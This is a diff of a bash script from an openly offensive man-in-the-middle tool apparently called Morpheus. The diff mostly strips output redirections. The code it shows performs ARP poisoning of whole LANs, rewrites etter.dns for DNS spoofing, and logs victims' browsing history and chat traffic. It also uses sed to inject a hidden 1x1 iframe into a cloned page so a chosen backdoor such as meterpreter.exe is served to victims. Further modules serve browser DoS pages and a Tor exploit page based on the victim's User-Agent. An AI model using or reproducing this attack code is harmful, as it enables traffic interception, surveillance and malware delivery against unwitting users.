@@ -766,12 +778,12 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-  rm $IPATH/output/redirect.ef > /dev/null 2>&1
-  mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
-  rm -R $ApachE/"Google Sphere_files" > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
+  rm $IPATH/output/redirect.ef
+  mv /tmp/etter.dns $Edns
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
+  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft # backup
+  rm -R $ApachE/"Google Sphere_files"
   cd $IPATH
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -800,7 +812,7 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 
@@ -814,20 +826,20 @@ sh_exit
 fi
 
 # get user input to build filter
-rm $IPATH/logs/grab_hosts.log > /dev/null 2>&1
+rm $IPATH/logs/grab_hosts.log
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
 
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
-  cp $IPATH/filters/grab_hosts.eft $IPATH/filters/grab_hosts.rb > /dev/null 2>&1 # backup
+  cp $IPATH/filters/grab_hosts.eft $IPATH/filters/grab_hosts.rb # backup
   # use SED bash command
-  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/grab_hosts.eft
   cd $IPATH
   sleep 1
 
@@ -853,21 +865,21 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
   dd=`ls $IPATH/logs`
   cd $IPATH/logs
   tr -cd '\11\12\15\40-\176' < grab_hosts.log > clean-file.log # remove non-ancii caracters
-  mv clean-file.log grab_hosts.log > /dev/null 2>&1
+  mv clean-file.log grab_hosts.log
   if ! [ -z "$dd" ]; then
   # display captured brosing hitory to user
-  HoSt=`cat $IPATH/logs/grab_hosts.log | grep "Host:"` > /dev/null 2>&1
+  HoSt=`cat $IPATH/logs/grab_hosts.log | grep "Host:"`
   echo ""
   echo "${white}Host:${YellowF} $UpL ${white}browsing history${RedF}!"
   echo "$HoSt"
-  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270) > /dev/null 2>&1
+  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
   fi
 
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1 # backup
-  rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
+  mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft # backup
+  rm $IPATH/output/grab_hosts.ef
   cd $IPATH
   sleep 2
 
@@ -896,7 +908,7 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 
@@ -911,13 +923,13 @@ fi
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
 
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  mkdir $IPATH/logs/capture > /dev/null 2>&1
+  mkdir $IPATH/logs/capture
   sleep 1
   echo ${BlueF}[☠]${white} Folder: logs/capture build${RedF}!${Reset};
   sleep 1
@@ -936,7 +948,7 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  rm -r $IPATH/logs/capture > /dev/null 2>&1
+  rm -r $IPATH/logs/capture
   cd $IPATH
   sleep 2
 
@@ -964,7 +976,7 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 
@@ -978,20 +990,20 @@ sh_exit
 fi
 
 # get user input to build filter
-rm $IPATH/logs/chat_services.log > /dev/null 2>&1
+rm $IPATH/logs/chat_services.log
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
 
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
-  cp $IPATH/filters/chat_services.eft $IPATH/filters/chat_services.rb > /dev/null 2>&1 # backup
+  cp $IPATH/filters/chat_services.eft $IPATH/filters/chat_services.rb # backup
   # use SED bash command
-  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/chat_services.eft > /dev/null 2>&1
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/chat_services.eft
   cd $IPATH
   sleep 1
 
@@ -1014,8 +1026,8 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft > /dev/null 2>&1 # backup
-  rm $IPATH/output/chat_services.ef > /dev/null 2>&1
+  mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft # backup
+  rm $IPATH/output/chat_services.ef
   cd $IPATH
   sleep 2
 
@@ -1042,20 +1054,20 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-selection --text "chose payload to be uploded\nexample:meterpreter.exe") > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-selection --text "chose payload to be uploded\nexample:meterpreter.exe")
 
 echo ${BlueF}[☠]${white} Parsing agent filename data ..${Reset};
 sleep 2
 echo "$UpL" > test.txt
-dIc=`grep -oE '[^/]+$' test.txt` > /dev/null 2>&1 # payload.exe
-rm test.txt > /dev/null 2>&1
+dIc=`grep -oE '[^/]+$' test.txt` # payload.exe
+rm test.txt
 
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
@@ -1063,20 +1075,20 @@ rm test.txt > /dev/null 2>&1
   # backup all files needed.
   cd $IPATH/bin
   cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
-  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
+  cp $Edns /tmp/etter.dns # backup
   # using bash SED to inject our malicious <iframe>
   cd phishing
   sed "s|<\/body>|<iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://$IP/$dIc\"><\/iframe><\/body>|" clone.html > clone2.html
   # copy files to apache2 webroot
-  mv clone2.html $ApachE/index.html > /dev/null 2>&1
-  cp miss.png $ApachE > /dev/null 2>&1
-  cp $UpL $ApachE > /dev/null 2>&1
-  rm clone2.html > /dev/null 2>&1
+  mv clone2.html $ApachE/index.html
+  cp miss.png $ApachE
+  cp $UpL $ApachE
+  rm clone2.html
   cd ..
   # use SED bash command to config our etter.dns
-  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
-  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
-  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  sed -i "s|TaRgEt|$IP|g" etter.dns
+  sed -i "s|PrE|$PrEfI|g" etter.dns
+  cp $IPATH/bin/etter.dns $Edns
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
@@ -1088,7 +1100,7 @@ echo ${RedF}[x]${white} Backdoor:${RedF}$dIc ${white}not found...${Reset};
 sleep 3
 cd $ApachE
 rm *.exe
-rm $ApachE/miss.png > /dev/null 2>&1
+rm $ApachE/miss.png
 cd $IPATH
 sh_exit # jump to exit ...
 fi
@@ -1098,7 +1110,7 @@ sleep 1
 
 # start apache2 webserver...
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
-/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
 
       # run mitm+filter
       cd $IPATH/logs
@@ -1127,11 +1139,11 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-  mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  rm $ApachE/miss.png > /dev/null 2>&1
-  rm $ApachE/$dIc > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
+  mv /tmp/etter.dns $Edns
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
+  rm $ApachE/miss.png
+  rm $ApachE/$dIc
   cd $IPATH
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -1164,15 +1176,15 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
+rm $IPATH/logs/UserAgent.log
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
 
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
@@ -1180,15 +1192,15 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
   # backup all files needed.
   cd $IPATH/bin
   cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
-  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
-  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
+  cp $Edns /tmp/etter.dns # backup
+  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb # backup
   # copy files to apache2 webroot
-  cp $IPATH/bin/phishing/Firefox-D0S-49.0.1.html $ApachE/index.html > /dev/null 2>&1
+  cp $IPATH/bin/phishing/Firefox-D0S-49.0.1.html $ApachE/index.html
   # use SED bash command
-  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
-  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
-  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
-  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft
+  sed -i "s|TaRgEt|$IP|g" etter.dns
+  sed -i "s|PrE|$PrEfI|g" etter.dns
+  cp $IPATH/bin/etter.dns $Edns
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
@@ -1200,7 +1212,7 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
 
 # start apache2 webserver...
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
-/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
 
       # run mitm+filter
       cd $IPATH/logs
@@ -1217,11 +1229,11 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
   nOn="49" # above versions are patched (official release its 51.0.1)...
   tr -cd '\11\12\15\40-\176' < UserAgent.log > clean-file.log # remove non-ancii caracters
-  mv clean-file.log UserAgent.log > /dev/null 2>&1
-  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
-  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
-  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
-  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent" | cut -d 'F' -f2 | cut -d '/' -f2 | cut -d '.' -f1` > /dev/null 2>&1
+  mv clean-file.log UserAgent.log
+  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}`
+  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}`
+  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}`
+  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent" | cut -d 'F' -f2 | cut -d '/' -f2 | cut -d '.' -f1`
   echo "${GreenF}    $HoSt"
   sleep 1
   echo "${GreenF}    $AcLa"
@@ -1269,12 +1281,12 @@ fi
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-  mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
-  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
-  rm $ApachE/index.html > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
+  mv /tmp/etter.dns $Edns
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
+  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft # backup
+  rm $IPATH/output/UserAgent.ef
+  rm $ApachE/index.html
   cd $IPATH
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -1307,15 +1319,15 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
+rm $IPATH/logs/UserAgent.log
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
 
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
@@ -1323,15 +1335,15 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
   # backup all files needed.
   cd $IPATH/bin
   cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
-  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
-  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
+  cp $Edns /tmp/etter.dns # backup
+  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb # backup
   # copy files to apache2 webroot
-  cp $IPATH/bin/phishing/Android-DOS-4.0.3.html $ApachE/index.html > /dev/null 2>&1
+  cp $IPATH/bin/phishing/Android-DOS-4.0.3.html $ApachE/index.html
   # use SED bash command
-  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
-  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
-  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
-  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft
+  sed -i "s|TaRgEt|$IP|g" etter.dns
+  sed -i "s|PrE|$PrEfI|g" etter.dns
+  cp $IPATH/bin/etter.dns $Edns
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
@@ -1343,7 +1355,7 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
 
 # start apache2 webserver...
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
-/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
 
       # run mitm+filter
       cd $IPATH/logs
@@ -1361,11 +1373,11 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   # Mozilla/5.0 (Linux; U; Android 4.0.3; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30
   nOn="Android"
   tr -cd '\11\12\15\40-\176' < UserAgent.log > clean-file.log # remove non-ancii caracters
-  mv clean-file.log UserAgent.log > /dev/null 2>&1
-  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
-  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
-  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
-  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Android"` > /dev/null 2>&1 # user-agent == Android
+  mv clean-file.log UserAgent.log
+  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}`
+  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}`
+  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}`
+  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Android"` # user-agent == Android
   echo "${GreenF}    $HoSt"
   sleep 1
   echo "${GreenF}    $AcLa"
@@ -1413,12 +1425,12 @@ fi
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-  mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
-  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
-  rm $ApachE/index.html > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
+  mv /tmp/etter.dns $Edns
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
+  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft # backup
+  rm $IPATH/output/UserAgent.ef
+  rm $ApachE/index.html
   cd $IPATH
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -1450,15 +1462,15 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
+rm $IPATH/logs/UserAgent.log
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
 
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
@@ -1466,16 +1478,16 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
   # backup all files needed.
   cd $IPATH/bin
   cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
-  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
-  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
+  cp $Edns /tmp/etter.dns # backup
+  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb # backup
   # copy files to apache2 webroot
-  cp $IPATH/bin/phishing/tor_0day/cssbanner.js $ApachE/cssbanner.js > /dev/null 2>&1
-  cp $IPATH/bin/phishing/tor_0day/Tor-Exploit.html $ApachE/index.html > /dev/null 2>&1
+  cp $IPATH/bin/phishing/tor_0day/cssbanner.js $ApachE/cssbanner.js
+  cp $IPATH/bin/phishing/tor_0day/Tor-Exploit.html $ApachE/index.html
   # use SED bash command
-  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
-  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
-  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
-  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft
+  sed -i "s|TaRgEt|$IP|g" etter.dns
